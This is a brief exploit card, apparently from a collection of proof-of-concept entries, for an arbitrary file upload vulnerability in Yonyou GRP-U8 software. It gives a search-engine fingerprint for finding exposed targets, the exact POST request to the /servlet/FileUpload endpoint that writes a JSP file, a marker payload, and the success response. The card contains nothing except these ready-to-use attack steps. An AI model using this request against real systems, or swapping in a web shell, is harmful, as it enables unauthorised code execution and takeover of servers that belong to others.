# 用友GRP-U8FileUpload文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **指纹**：`app="用友-GRP-U8"`
- **请求**：`POST /servlet/FileUpload?fileName=dudesuite.jsp&actionID=update HTTP/1.1`

**Payload**
```
<% out.println("dudesuite");%>
```
- **响应特征**：200